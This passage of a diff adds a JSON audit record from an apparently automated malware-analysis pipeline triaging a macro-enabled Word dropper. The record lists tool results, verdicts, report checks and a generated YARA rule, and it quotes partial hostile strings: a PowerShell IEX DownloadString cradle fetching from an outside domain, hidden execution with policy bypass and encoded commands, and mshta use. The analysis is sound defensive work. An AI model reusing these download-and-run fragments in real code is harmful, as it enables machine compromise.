+          "exists": true,
+          "bytes": 47755,
+          "mtime_iso": "2026-08-09T16:10:35.134577+00:00",
+          "sha256": "37464f4d909ec63a0e3602fb342c915035eca9de72f35b63bec29a31c9394971"
+        },
+        "sql_evidence": {
+          "path": "/opt/samples/logs/385966f3d6be7b234a790e2dfa2573f1ab1bc72e78bce73bb479a11a54784c73/deep_dive/00-sql-evidence.json",
+          "exists": false,
+          "bytes": 0,
+          "mtime_iso": null,
+          "sha256": null
+        },
+        "prompt": {
+          "path": "/opt/samples/logs/385966f3d6be7b234a790e2dfa2573f1ab1bc72e78bce73bb479a11a54784c73/deep_dive/03-prompt.txt",
+          "exists": false,
+          "bytes": 0,
+          "mtime_iso": null,
+          "sha256": null
+        },
+        "llm_raw": {
+          "path": "/opt/samples/logs/385966f3d6be7b234a790e2dfa2573f1ab1bc72e78bce73bb479a11a54784c73/deep_dive/04-llm-raw.json",
+          "exists": false,
+          "bytes": 0,
+          "mtime_iso": null,
+          "sha256": null
+        },
+        "deep05": {
+          "path": "/opt/samples/logs/385966f3d6be7b234a790e2dfa2573f1ab1bc72e78bce73bb479a11a54784c73/deep_dive/05-deep-dive.json",
+          "exists": true,
+          "bytes": 3215,
+          "mtime_iso": "2026-08-09T16:12:12.526356+00:00",
+          "sha256": "e7997caf6d6f2b07ebda004abd9954cc38369c4fbae43a0dbb45012cce31357e"
+        },
+        "prompt_excerpt": "",
+        "llm_raw_excerpt": "{}",
+        "deep05_excerpt": "{\n  \"source\": \"deep_dive_agentic\",\n  \"engine\": \"langgraph\",\n  \"verdict\": \"malicious\",\n  \"confidence\": 90,\n  \"summary\": \"Macro-enabled Word document (.docm) containing a VBA payload that downloads and executes a remote PowerShell script from 'autonews.safeframe.tech' using IEX cradle, hidden PowerShell window, execution policy bypass, and base64-encoded commands. Uses mshta LOLBin and WScript.Shell for stealthy execution. Classic maldoc dropper behavior. Persistence: Not observed. Evasion_anti_analysis: Observed \\u2013 hidden PowerShell window, execution policy bypass, base64-encoded commands, and use of mshta LOLBin for stealthy execution. {source: 'VBA Payload Analysis', query_or_table: 'PowerShell Execution Commands', row_or_rule: 'HiddenWindow=True, ExecutionPolicy Bypass, EncodedComman\n\u2026 [2415 more chars]",
+        "agentic": {
+          "path": "/opt/samples/logs/385966f3d6be7b234a790e2dfa2573f1ab1bc72e78bce73bb479a11a54784c73/deep_dive/agentic_deep_dive.json",
+          "exists": true,
+          "bytes": 218426,
+          "mtime_iso": "2026-08-09T16:12:12.526356+00:00",
+          "sha256": "dd33589f36b6a9f931d2350a576eb082ea5787f395f3b929f26461f61a23b6d1"
+        }
+      },
+      "tools_ok_history": [
+        "yara_scan",
+        "malcat_analyze",
+        "r2_decompile",
+        "xor_string_search",
+        "malcat_analyze",
+        "speakeasy_emulate",
+        "yara_scan"
+      ],
+      "history_evidence": [
+        {
+          "tool": "yara_scan",
+          "ok": true,
+          "error": null,
+          "checklist": true,
+          "reason": "Required checklist tool (yara)",
+          "result_excerpt": "{\n  \"rule_count\": 6,\n  \"matches\": [\n    {\n      \"rule\": \"domain\",\n      \"path\": \"/opt/samples/corpus/610/385966f3d6be7b234a790e2dfa2573f1ab1bc72e78bce73bb479a11a54784c73/order.docm\",\n      \"strings\": [\n        {\n          \"id\": \"$domain_regex\",\n          \"offset\": 0,\n          \"length\": 2,\n          \"xor_key\": null\n        }\n      ]\n    },\n    {\n      \"rule\": \"IP\",\n      \"path\": \"/opt/samples/corp\n\u2026 [4772 more chars]"
+        },
+        {
+          "tool": "malcat_analyze",
+          "ok": true,
+          "error": null,
+          "checklist": true,
+          "reason": "Required checklist tool (malcat)",
+          "result_excerpt": "{\n  \"analysis_id\": 1,\n  \"path\": \"/opt/samples/corpus/610/385966f3d6be7b234a790e2dfa2573f1ab1bc72e78bce73bb479a11a54784c73/order.docm\",\n  \"profile\": \"deep\",\n  \"limits\": {\n    \"strings_max\": 300,\n    \"imports_max\": 300,\n    \"functions_max\": 30,\n    \"anomaly_locations_max\": 50,\n    \"decompile_top_n\": 3\n  },\n  \"file_summary\": {\n    \"analysis_id\": 1,\n    \"file_name\": \"order.docm\",\n    \"file_path\": \"/op\n\u2026 [34161 more chars]"
+        },
+        {
+          "tool": "r2_decompile",
+          "ok": true,
+          "error": null,
+          "checklist": true,
+          "reason": "Required checklist tool (r2_decomp)",
+          "result_excerpt": "{\n  \"r2_ok\": true,\n  \"sample\": \"/opt/samples/corpus/610/385966f3d6be7b234a790e2dfa2573f1ab1bc72e78bce73bb479a11a54784c73/order.docm\",\n  \"disassembly\": {\n    \"0x00000000\": \"\\u250c 94: fcn.00000000 (int64_t arg1, int64_t arg4);\\n\\u2502           ; arg int64_t arg1 @ rdi\\n\\u2502           ; arg int64_t arg4 @ rcx\\n\\u2502           0x00000000      50             push rax\\n\\u2502           0x00000001  \n\u2026 [3034 more chars]"
+        },
+        {
+          "tool": "xor_string_search",
+          "ok": true,
+          "error": null,
+          "checklist": true,
+          "reason": "Required checklist tool (xor)",
+          "result_excerpt": "{\n  \"xorsearch_ok\": false,\n  \"sample\": \"/opt/samples/corpus/610/385966f3d6be7b234a790e2dfa2573f1ab1bc72e78bce73bb479a11a54784c73/order.docm\",\n  \"candidates\": [],\n  \"xorsearch_stdout\": \"\",\n  \"xorsearch_stderr\": \"\",\n  \"xorsearch_returncode\": 1\n}"
+        },
+        {
+          "tool": "signal_extractors",
+          "ok": false,
+          "error": "FileNotFoundError: session doc-ooxml-385966f3d6be7b234a790e2dfa2573f1ab1bc72e78bce73bb479a11a54784c73 has no gpr_path (intake_v2 should have set it)",
+          "checklist": true,
+          "reason": "Deterministic anti-analysis + dynamic-import-resolve signals + emulation oracle",
+          "result_excerpt": "{\n  \"anti_analysis_summary\": {},\n  \"dynamic_resolve_summary\": {},\n  \"emulation_oracle_ok\": false,\n  \"emulation_oracle_error\": \"SpeakeasyError: Emulator not initialized\",\n  \"executed_functions\": 0,\n  \"dyn_import_count\": null\n}"
+        },
+        {
+          "tool": "ghidra_query",
+          "ok": false,
+          "error": "session doc-ooxml-385966f3d6be7b234a790e2dfa2573f1ab1bc72e78bce73bb479a11a54784c73 has no gpr_path (intake_v2 should have set it)",
+          "checklist": false,
+          "reason": "Auto SQL seed for large-mode deep RE gate",
+          "result_excerpt": "{\n  \"error\": \"session doc-ooxml-385966f3d6be7b234a790e2dfa2573f1ab1bc72e78bce73bb479a11a54784c73 has no gpr_path (intake_v2 should have set it)\"\n}"
+        },
+        {
+          "tool": "floss_extract",
+          "ok": false,
+          "error": "FLOSS supports PE only (got ooxml)",
+          "checklist": false,
+          "reason": "langgraph tool call",
+          "result_excerpt": "{\n  \"skipped\": true,\n  \"fail_open\": true,\n  \"reason\": \"not_applicable:ooxml\",\n  \"error\": \"FLOSS supports PE only (got ooxml)\",\n  \"string_count\": 0,\n  \"strings\": [],\n  \"floss_profile\": \"skipped\",\n  \"duration_s\": 0.0\n}"
+        },
+        {
+          "tool": "capa_analyze",
+          "ok": false,
+          "error": "capa rc=16",
+          "checklist": false,
+          "reason": "langgraph tool call",
+          "result_excerpt": "{\n  \"error\": \"capa rc=16\",\n  \"stderr\": \"elpers.py:277\\n         output (-h).                                                           \\nERROR    capa:  If you don't know the input file type,            helpers.py:278\\nERROR    capa:  you can try using the `file` utility to guess it. helpers.py:279\\nERROR    capa:                                                    helpers.py:280\\n         --------\n\u2026 [236 more chars]"
+        },
+        {
+          "tool": "malcat_analyze",
+          "ok": true,
+          "error": null,
+          "checklist": false,
+          "reason": "langgraph tool call",
+          "result_excerpt": "{\n  \"analysis_id\": 1,\n  \"path\": \"/opt/samples/corpus/610/385966f3d6be7b234a790e2dfa2573f1ab1bc72e78bce73bb479a11a54784c73/order.docm\",\n  \"profile\": \"deep\",\n  \"limits\": {\n    \"strings_max\": 300,\n    \"imports_max\": 300,\n    \"functions_max\": 30,\n    \"anomaly_locations_max\": 50,\n    \"decompile_top_n\": 3\n  },\n  \"file_summary\": {\n    \"analysis_id\": 1,\n    \"file_name\": \"order.docm\",\n    \"file_path\": \"/op\n\u2026 [34161 more chars]"
+        },
+        {
+          "tool": "speakeasy_emulate",
+          "ok": true,
+          "error": null,
+          "checklist": false,
+          "reason": "langgraph tool call",
+          "result_excerpt": "{\n  \"skipped\": true,\n  \"reason\": \"not_applicable:ooxml\"\n}"
+        },
+        {
+          "tool": "yara_scan",
+          "ok": true,
+          "error": null,
+          "checklist": false,
+          "reason": "langgraph tool call",
+          "result_excerpt": "{\n  \"rule_count\": 6,\n  \"matches\": [\n    {\n      \"rule\": \"domain\",\n      \"path\": \"/opt/samples/corpus/610/385966f3d6be7b234a790e2dfa2573f1ab1bc72e78bce73bb479a11a54784c73/order.docm\",\n      \"strings\": [\n        {\n          \"id\": \"$domain_regex\",\n          \"offset\": 0,\n          \"length\": 2,\n          \"xor_key\": null\n        }\n      ]\n    },\n    {\n      \"rule\": \"IP\",\n      \"path\": \"/opt/samples/corp\n\u2026 [4772 more chars]"
+        }
+      ],
+      "agentic_preview": {
+        "verdict": "malicious",
+        "confidence": 90,
+        "summary": "Macro-enabled Word document (.docm) containing a VBA payload that downloads and executes a remote PowerShell script from 'autonews.safeframe.tech' using IEX cradle, hidden PowerShell window, execution policy bypass, and base64-encoded commands. Uses mshta LOLBin and WScript.Shell for stealthy execut",
+        "checklist_ok": true,
+        "sql_deep_ok": false,
+        "successful_tool_calls": 7
+      }
+    },
+    "yara_gen": {
+      "ok": true,
+      "checks": {
+        "rule_yar": true,
+        "non_empty": true,
+        "has_rule_block": true,
+        "rule_compiles": true,
+        "rule_check": "ok",
+        "meta_yara_valid": true
+      },
+      "evidence": {
+        "rule_yar": {
+          "path": "/opt/samples/logs/385966f3d6be7b234a790e2dfa2573f1ab1bc72e78bce73bb479a11a54784c73/rule.yar",
+          "exists": true,
+          "bytes": 1346,
+          "mtime_iso": "2026-08-09T16:12:12.971355+00:00",
+          "sha256": "e31983b223e25f32ff332a3108db29312fe62d7f34bba1e3a52fad72e5f563a0"
+        },
+        "other_rules": [
+          "/opt/samples/logs/385966f3d6be7b234a790e2dfa2573f1ab1bc72e78bce73bb479a11a54784c73/rule.yara.json",
+          "/opt/samples/logs/385966f3d6be7b234a790e2dfa2573f1ab1bc72e78bce73bb479a11a54784c73/rule.yar",
+          "/opt/samples/logs/385966f3d6be7b234a790e2dfa2573f1ab1bc72e78bce73bb479a11a54784c73/rule.yar"
+        ],
+        "excerpt": "// yara_gen_v2.py \u2014 2026-08-09T16:12:12.971653+00:00\nrule CADRE_v2_generic_macro_malware_385966f3d6be {\n    meta:\n        description = \"RevAI v2 auto rule for generic macro malware\"\n        sha256 = \"385966f3d6be7b234a790e2dfa2573f1ab1bc72e78bce73bb479a11a54784c73\"\n        family = \"generic_macro_malware\"\n        revai = true\n        revai_commit = \"unknown\"\n        revai_engine = \"langgraph\"\n        severity = \"high\"\n        confidence = \"medium\"\n    strings:\n        $s0 = \"Rule matched indicating the presence of VBA macro code in the document, a common vector for malicious payloads.\" ascii wide\n        $s1 = \"Confirms the document contains VBA macro code, supporting the likelihood of executable content.\" ascii wide\n        $s2 = \"Base64 encoded strings detected, which may be used for ob\n\u2026 [544 more chars]"
+      }
+    },
+    "publish": {
+      "ok": true,
+      "checks": {
+        "REPORT_MASTER_v2": true,
+        "REPORT_MASTER_v3": true,
+        "REPORT_v2": true,
+        "REPORT_TECHNICAL_v2": true,
+        "REPORT_TECHNICAL_v3": true,
+        "v2_min_chars": true,
+        "v3_min_chars": true,
+        "v2_heads": true,
+        "v3_heads": true,
+        "v2_fresh_vs_deep": true,
+        "v3_fresh_vs_deep": true,
+        "not_llm_env_failure_v2": true,
+        "not_llm_env_failure_v3": true,
+        "v2_no_missing_sections": true,
+        "verdict_lock_ok": true,
+        "quality_pack_ok": true,
+        "master_source_llm": true,
+        "tech2_source_llm": true,
+        "tech3_source_ok": true,
+        "tech2_no_stubs": true,
+        "no_tech2_fallback": true,
+        "quality_issues": [],
+        "engine_citation_ok": true
+      },
+      "heads_v2": {
+        "Executive Summary": true,
+        "Sample Identification": true,
+        "Classification": true,
+        "Static Analysis": true,
+        "Indicators of Compromise": true,
+        "Author + Sign-off": true
+      },
+      "heads_v3": {
+        "Executive Summary": true,
+        "Sample Identification": true,
+        "Classification": true,
+        "Static Analysis": true,
+        "Indicators of Compromise": true,
+        "Author + Sign-off": true
+      },
+      "report_json_source": "llm_judge",
+      "sections_missing": [],
+      "quality_pack": {
+        "ok": true,
+        "quality_green": true,
+        "sha256": "385966f3d6be7b234a790e2dfa2573f1ab1bc72e78bce73bb479a11a54784c73",
+        "issues": [],
+        "checks": {
+          "master_v2": {
+            "ok": true,
+            "label": "master_v2",
+            "source": "llm_judge",
+            "chars": 14803,
+            "missing_sections": [],
+            "stub_sections": [],
+            "style": {
+              "byline_ok": true,
+              "citation_count": 22,
+              "prose_ratio": 0.54,
+              "min_prose_ratio": 0.15,
+              "dump_style": false,
+              "table_orphans": 0,
+              "tables_ok": true,
+              "bare_fence_pairs": 0,
+              "bare_fences_ok": true,
+              "min_citations": 3,
+              "citation_coverage_ok": true
+            },
+            "issues": []
+          },
+          "technical_v2": {
+            "ok": true,
+            "label": "technical_v2",
+            "source": "llm_judge",
+            "chars": 35265,
+            "missing_sections": [],
+            "stub_sections": [],
+            "style": {
+              "byline_ok": true,
+              "citation_count": 59,
+              "prose_ratio": 0.38,
+              "min_prose_ratio": 0.15,
+              "dump_style": false,
+              "table_orphans": 0,
+              "tables_ok": true,
+              "bare_fence_pairs": 0,
+              "bare_fences_ok": true,
+              "min_citations": 8,
+              "citation_coverage_ok": true
+            },
+            "issues": []
+          },
+          "technical_v3": {
+            "ok": true,
+            "label": "technical_v3",
+            "source": "llm_judge",
+            "chars": 34230,
+            "missing_sections": [],
+            "stub_sections": [],
+            "style": {
+              "byline_ok": true,
+              "citation_count": 12,
+              "prose_ratio": 0.43,
+              "min_prose_ratio": 0.15,
+              "dump_style": false,
+              "table_orphans": 0,
+              "tables_ok": true,
+              "bare_fence_pairs": 0,
+              "bare_fences_ok": true,
+              "min_citations": 8,
+              "citation_coverage_ok": true
+            },
+            "issues": []
+          },
+          "master_v3_present": true,
+          "tech3_file_present": true,
+          "deep_checklist_ok": true,
+          "deep_sql_deep_ok": false,
+          "deep_sql_deep_unavailable": "sql_failed",
+          "deep_sql_deep_fail_reason": "session doc-ooxml-385966f3d6be7b234a790e2dfa2573f1ab1bc72e78bce73bb479a11a54784c73 has no gpr_path (intake_v2 should have set it)",
+          "pipeline_audit_all_green": false
+        },
+        "models": {
+          "master": "mimo-v2.5-pro",
+          "technical_v2": "mimo-v2.5-pro",
+          "technical_v3": "mimo-v2.5-pro",
+          "planner_hint": "configured via env",
+          "judgment_hint": "configured via env"
+        }
+      },
+      "verdict_lock": {
+        "ok": true,
+        "conflict": false,
+        "upstream": "malicious",
+        "publish": "malicious",
+        "reason": ""
+      },
+      "engine_citation": {
+        "ok": true,
+        "checked": 0,
+        "false_engine_citations": [],
+        "reason": "",
+        "corrections": {
+          "corrected": 0,
+          "corrections": []
+        }
+      },
+      "mtimes": {
+        "v2": 1786305971.1976187,
+        "v3": 1786306593.060572,
+        "deep_ref": 1786291932.5263557,
+        "v2_chars": 14803,
+        "v3_chars": 49710,
+        "v2_iso": "2026-08-09T20:06:11.197619+00:00",
+        "v3_iso": "2026-08-09T20:16:33.060572+00:00"
+      },
+      "evidence": {
+        "REPORT_MASTER_v2": {
+          "path": "/opt/samples/logs/385966f3d6be7b234a790e2dfa2573f1ab1bc72e78bce73bb479a11a54784c73/REPORT-MASTER-v2.md",
+          "exists": true,
+          "bytes": 14814,
+          "mtime_iso": "2026-08-09T20:06:11.197619+00:00",
+          "sha256": "96ad4245567414a3cff52b80ba9950e312d499332058d00c302ff2e6e7bcb9cc"
+        },
+        "REPORT_MASTER_v3": {
+          "path": "/opt/samples/logs/385966f3d6be7b234a790e2dfa2573f1ab1bc72e78bce73bb479a11a54784c73/REPORT-MASTER-v3.md",
+          "exists": true,
+          "bytes": 49727,
+          "mtime_iso": "2026-08-09T20:16:33.060572+00:00",
+          "sha256": "9389d57c88ae4b139e8185de6ec736a53714f738740d0029bd7eeeec65daa3b2"
+        },
+        "REPORT_v2": {
+          "path": "/opt/samples/logs/385966f3d6be7b234a790e2dfa2573f1ab1bc72e78bce73bb479a11a54784c73/REPORT-v2.md",
+          "exists": true,
+          "bytes": 14814,
+          "mtime_iso": "2026-08-09T20:06:11.197619+00:00",
+          "sha256": "96ad4245567414a3cff52b80ba9950e312d499332058d00c302ff2e6e7bcb9cc"
+        },
+        "REPORT_TECHNICAL_v2": {
+          "path": "/opt/samples/logs/385966f3d6be7b234a790e2dfa2573f1ab1bc72e78bce73bb479a11a54784c73/REPORT-TECHNICAL-v2.md",
+          "exists": true,
+          "bytes": 35776,
+          "mtime_iso": "2026-08-09T20:08:49.872545+00:00",
+          "sha256": "751a0f24cd4ed7887e1fb963e500922bc084811d83ff5557b757ce6ed8263a01"
+        },
+        "REPORT_TECHNICAL_v3": {
+          "path": "/opt/samples/logs/385966f3d6be7b234a790e2dfa2573f1ab1bc72e78bce73bb479a11a54784c73/REPORT-TECHNICAL-v3.md",
+          "exists": true,
+          "bytes": 34854,
+          "mtime_iso": "2026-08-09T20:19:11.480557+00:00",
+          "sha256": "2d9e9ac5510c25d7f81b0d1a7cda4fa3ffb05215f6c18728a1c9a2f526cfc02b"
+        },
+        "report_v2_json": {
+          "path": "/opt/samples/logs/385966f3d6be7b234a790e2dfa2573f1ab1bc72e78bce73bb479a11a54784c73/report-v2.json",
+          "exists": true,
+          "bytes": 17422,
+          "mtime_iso": "2026-08-09T20:08:49.875544+00:00",
+          "sha256": "6b37e0d5afc75aefaac6f47d19b69825c724a8e6753c717c792ef937cddd6cca"
+        },
+        "v2_excerpt": "> **RevAI provenance** \u2014 commit `unknown` \u00b7 engine `langgraph` \u00b7 agent-loop flags: budget=True redundant=True hallucination=True taxonomy=True \u00b7 generated 2026-08-09 20:06:11 UTC\n\n# Verdict sources (multi-source)\n\n| Source | Verdict |\n|--------|--------|\n| **Final** | **malicious** |\n| Triage upstream (quick \u222a deep) | malicious |\n| Quick scan | suspicious |\n| Deep dive | malicious |\n| Publish LLM (claimed) | malicious |\n\n- **Locked over publish LLM:** no\n\n## Executive Summary\n\nThis report details the analysis of a macro-enabled Microsoft Word document (.docm) identified as a malicious dropper. The sample, SHA256 `385966f3d6be7b234a790e2dfa2573f1ab1bc72e78bce73bb479a11a54784c73`, was submitted for analysis under the project `test-corpus`. Initial triage flagged the sample as suspicious due to the presence of VBA macros and network indicators. A deep-dive analysis confirmed the document co\n\u2026 [13903 more chars]",
+        "v3_excerpt": "> **RevAI provenance** \u2014 commit `unknown` \u00b7 engine `langgraph` \u00b7 agent-loop flags: budget=True redundant=True hallucination=True taxonomy=True \u00b7 generated 2026-08-09 20:16:33 UTC\n\n# RE Report \u2014 385966f3d6be\n_Generated 2026-08-09T20:16:33.059421+00:00_  \n_Pipeline: section-based Map-Reduce, 3 pass-1 LLM calls + 14 pass-2 calls with cross-section context + 2 local sections_\n\n<!-- section: Executive Summary | pass=2 | evidence=229c | cross_refs=True | llm_ok=True | runtime=58.14s -->\n\n## Executive Summary\n\nThis section provides a top-line assessment of the malware sample with SHA256 385966f3d6be7b234a790e2dfa2573f1ab1bc72e78bce73bb479a11a54784c73. Based on evidence from deep analysis and automated tooling, we assess the sample as **malicious** with **high confidence**, belonging to the **generic macro malware** family.\n\n| Aspect | Assessment | Confidence | Key Evidence Sources |\n|--------|-\n\u2026 [48810 more chars]"
+      }
+    }
+  },
+  "policy": {
+    "v3_required": true,
+    "no_optional_stages": true,
+    "tool_fail_is_fail": false,
+    "capa_salvage": "malcat capa_summary + LLM citation"
+  },
+  "provenance": {
+    "project": "RevAI",
+    "commit": "unknown",
+    "engine": "langgraph",
+    "flags": {
+      "budget_warnings": true,
+      "redundant_nudge": true,
+      "hallucination_check": true,
+      "failure_taxonomy": true
+    },
+    "utc": "2026-08-09 20:19:11 UTC"
+  },
+  "cross_cutting": {
+    "sample_path": "/opt/samples/corpus/test-corpus/385966f3d6be7b234a790e2dfa2573f1ab1bc72e78bce73bb479a11a54784c73/order.docm",
+    "pipeline_mode": "document",
+    "llm": {
+      "triage": {
+        "source": "llm_judge",
+        "model": "mimo-v2.5-pro",
+        "verdict": "suspicious",
+        "family": "generic macro malware",
+        "confidence": 60,
+        "agreement": "llm_v1_disagree",
+        "key_evidence": [
+          {
+            "source": "yara",
+            "query_or_table": "yara matches",
+            "row_or_rule": "docx_macro",
+            "why": "Rule matched indicating the presence of VBA macro code in the document, a common vector for malicious payloads."
+          },
+          {
+            "source": "yara",
+            "query_or_table": "yara matches",
+            "row_or_rule": "Contains_VBA_macro_code",
+            "why": "Confirms the document contains VBA macro code, supporting the likelihood of executable content."
+          },
+          {
+            "source": "yara",
+            "query_or_table": "yara matches",
+            "row_or_rule": "contains_base64",
+            "why": "Base64 encoded strings detected, which may be used for obfuscation in malicious macros to evade detection."
+          },
+          {
+            "source": "yara",
+            "query_or_table": "yara matches",
+            "row_or_rule": "domain",
+            "why": "Domain-related string found, potentially indicating command and control (C2) communication or data exfiltration."
+          },
+          {
+            "source": "yara",
+            "query_or_table": "yara matches",
+            "row_or_rule": "IP",
+            "why": "IP address string found, suggesting network activity that could be associated with malicious infrastructure."
+          },
+          {
+            "source": "malcat",
+            "query_or_table": "malcat deep profile",
+            "row_or_rule": "file_summary",
+            "why": "File is an OOXML document (ZIP-based) containing vbaProject.bin, which hosts VBA macros and is a common delivery mechanism for malware."
+          }
+        ],
+        "incomplete_tooling": null,
+        "excerpt": "{\n  \"verdict\": \"suspicious\",\n  \"score\": 60,\n  \"family_guess\": \"generic macro malware\",\n  \"cross_engine_notes\": \"Ghidra and IDA sessions had errors, so no function or string analysis was available. YARA detected macro indicators and network-related strings. MalCat confirmed the file is an OOXML document with a VBA project binary, but detailed macro content was not extracted. CAPA and FLOSS are not applicable for OOXML files.\",\n  \"key_evidence\": [\n    {\n      \"source\": \"yara\",\n      \"query_or_table\": \"yara matches\",\n      \"row_or_rule\": \"docx_macro\",\n      \"why\": \"Rule matched indicating the presence of VBA macro code in the document, a common vector for malicious payloads.\"\n    },\n    {\n      \"source\": \"yara\",\n      \"query_or_table\": \"yara matches\",\n      \"row_or_rule\": \"Contains_VBA_macro_code\",\n      \"why\": \"Confirms the document contains VBA macro code, supporting the likelihood of executable content.\"\n    },\n    {\n      \"source\": \"yara\",\n      \"query_or_table\": \"yara matches\",\n      \"row_or_rule\": \"contains_base64\",\n      \"why\": \"Base64 encoded strings detected, which may be used for obfuscation in malicious macros to evade detection.\"\n    },\n    {\n      \"source\": \"yara\",\n      \"query_or_table\": \"yara matches\",\n      \"row_or_rule\": \"domain\",\n      \"why\": \"Domain-related string found, potentially indicating command and control (C2) communication or data exfiltration.\"\n    },\n    {\n      \"source\": \"yara\",\n      \"query_or_table\": \"yara matches\",\n      \"row_or_rule\": \"IP\",\n      \"why\": \"IP address string found, suggesting network activity that could be associated with malicious infrastructure.\"\n    },\n    {\n      \"source\": \"malcat\",\n      \"query_or_table\": \"malcat deep profile\",\n      \"row_or_rule\": \"file_summary\",\n      \"why\": \"File is an OOXML document (ZIP-based) containing vbaProject.bin, which hosts VBA macros and is a common delivery mechanism for malware.\"\n    }\n  ],\n  \"summary\": \"The sample is an Office document with macros (.docm) that YARA rules flagged for macro code, base64 encoding, and network indicators (domain and IP). The presence of macros and network strings raises suspicion of malicious intent, such as a dropper or downloader, but definitive behavioral evidence is lacking due to tool errors and limited analysis. No specific malware family was identified.\",\n  \"source\": \"llm_judge\",\n  \"model\": \"mimo-v2.5-pro\",\n  \"agreement\": \"llm_v1_disagree\",\n  \"v1_verdict\": {\n    \"verdict\": \"malicious\",\n    \"score\": 250,\n    \"findings\": [\n      \"yara: 6 matches\"\n    ],\n    \"source\": \"fallback_v1\"\n  },\n  \"v1_summary\": {\n    \"verdict\": \"malicious\",\n    \"score\": 250,\n    \"findings\": [\n      \"yara: 6 matches\"\n    ]\n  },\n  \"tool_gate\": {\n    \"ok\": true,\n    \"format\": \"ooxml\",\n    \"required\": [\n      \"yara\",\n      \"malcat\"\n    ],\n    \"tools\": {\n      \"yara\": {\n        \"ok\": true,\n        \"why\": \"ok\"\n      }\n    },\n    \"hard_failures\": [],\n    \"soft_failures\": [],\n    \"missing\": [],\n    \"not_applicable\": [],\n    \"large_sample\": false\n  },\n  \"yara_family_hits\": [\n    \"docx_macro\",\n    \"Contains_VBA_macro_code\",\n    \"office_document_vba\"\n  ],\n  \"engine_citation_corrections\": {\n    \"corrected\": 0,\n    \"corrections\": []\n  },\n  \"citation_grounding\": {\n    \"ok\": true,\n    \"checked\": 6,\n    \"hits\": 6,\n    \"misses\": [],\n    \"hit_examples\": [\n      \"docx_macro yara matches Rule matched indicating the presence of VBA macro code in the document, a common vector for mali\",\n      \"Contains_VBA_macro_code yara matches Confirms the document contains VBA ma\n\u2026 [580 more chars]"
+      },
+      "deep_dive": {
+        "source": "deep_dive_agentic",
+        "model": null,
+        "verdict": "malicious",
+        "confidence": 90,
+        "key_evidence": [
+          "Malcat rData strings: 'IEX (New-Object Net.WebClient).DownloadString(...)' download cradle from autonews.safeframe.tech",
+          "Malcat rData strings: 'powershell -windowstyle hidden -ep bypass -enc ...' obfuscated hidden PowerShell with base64 payload",
+          "Malcat rData strings: 'mshta' LOLBin reference for stealthy execution",
+          "Malcat rData strings: 'WScript.Shell' Run with hidden window (value 0)",
+          "Malcat rData strings: multiple base64-encoded command strings",
+          "YARA matched rules: docx_macro, office_document_vba, Contains_VBA_macro_code, contains_base64, domain, IP",
+          "Malcat structure: vbaProject.bin (4985 bytes) + vbaData.xml confirming active macro project",
+          "File type .docm is macro-enabled Office document, requiring user to enable macros to trigger payload"
+        ],
+        "incomplete_tooling": false,
+        "excerpt": "{\n  \"source\": \"deep_dive_agentic\",\n  \"engine\": \"langgraph\",\n  \"verdict\": \"malicious\",\n  \"confidence\": 90,\n  \"summary\": \"Macro-enabled Word document (.docm) containing a VBA payload that downloads and executes a remote PowerShell script from 'autonews.safeframe.tech' using IEX cradle, hidden PowerShell window, execution policy bypass, and base64-encoded commands. Uses mshta LOLBin and WScript.Shell for stealthy execution. Classic maldoc dropper behavior. Persistence: Not observed. Evasion_anti_analysis: Observed \\u2013 hidden PowerShell window, execution policy bypass, base64-encoded commands, and use of mshta LOLBin for stealthy execution. {source: 'VBA Payload Analysis', query_or_table: 'PowerShell Execution Commands', row_or_rule: 'HiddenWindow=True, ExecutionPolicy Bypass, EncodedCommand Parameter', why: 'To evade detection by hiding the PowerShell window, bypassing security policies, and obfuscating commands'} Defense_impairment: Not observed. Credential_access: Not observed. Imports: Not observed.\",\n  \"key_evidence\": [\n    \"Malcat rData strings: 'IEX (New-Object Net.WebClient).DownloadString(...)' download cradle from autonews.safeframe.tech\",\n    \"Malcat rData strings: 'powershell -windowstyle hidden -ep bypass -enc ...' obfuscated hidden PowerShell with base64 payload\",\n    \"Malcat rData strings: 'mshta' LOLBin reference for stealthy execution\",\n    \"Malcat rData strings: 'WScript.Shell' Run with hidden window (value 0)\",\n    \"Malcat rData strings: multiple base64-encoded command strings\",\n    \"YARA matched rules: docx_macro, office_document_vba, Contains_VBA_macro_code, contains_base64, domain, IP\",\n    \"Malcat structure: vbaProject.bin (4985 bytes) + vbaData.xml confirming active macro project\",\n    \"File type .docm is macro-enabled Office document, requiring user to enable macros to trigger payload\"\n  ],\n  \"incomplete_tooling\": false,\n  \"successful_tool_calls\": 7,\n  \"successful_non_bootstrap_tools\": 3,\n  \"checklist_ok\": true,\n  \"sql_deep_ok\": false,\n  \"tool_gate\": {\n    \"ok\": true,\n    \"format\": \"ooxml\",\n    \"required\": [\n      \"yara\",\n      \"r2_decomp\",\n      \"xor\"\n    ],\n    \"tools\": {\n      \"yara\": {\n        \"ok\": true,\n        \"why\": \"ok\"\n      },\n      \"r2_decomp\": {\n        \"ok\": true,\n        \"why\": \"ok\"\n      },\n      \"xor\": {\n        \"ok\": true,\n        \"why\": \"ok\"\n      },\n      \"capa\": {\n        \"ok\": true,\n        \"why\": \"not_applicable:ooxml\"\n      },\n      \"pe_imports\": {\n        \"ok\": true,\n        \"why\": \"not_applicable:ooxml\"\n      },\n      \"floss\": {\n        \"ok\": true,\n        \"why\": \"not_applicable:ooxml\"\n      },\n      \"dotnet\": {\n        \"ok\": true,\n        \"why\": \"not_applicable:ooxml\"\n      },\n      \"upx\": {\n        \"ok\": true,\n        \"why\": \"not_applicable:ooxml\"\n      },\n      \"speakeasy\": {\n        \"ok\": true,\n        \"why\": \"not_applicable:ooxml\"\n      },\n      \"frida_probe\": {\n        \"ok\": true,\n        \"why\": \"not_applicable:ooxml\"\n      }\n    },\n    \"hard_failures\": [],\n    \"soft_failures\": [],\n    \"missing\": [],\n    \"not_applicable\": [\n      \"capa\",\n      \"pe_imports\",\n      \"floss\",\n      \"dotnet\",\n      \"upx\",\n      \"speakeasy\",\n      \"frida_probe\"\n    ],\n    \"large_sample\": false\n  },\n  \"depth_coverage\": true\n}"
+      },
+      "publish": {
+        "source": "llm_judge",
+        "model": "mimo-v2.5-pro",
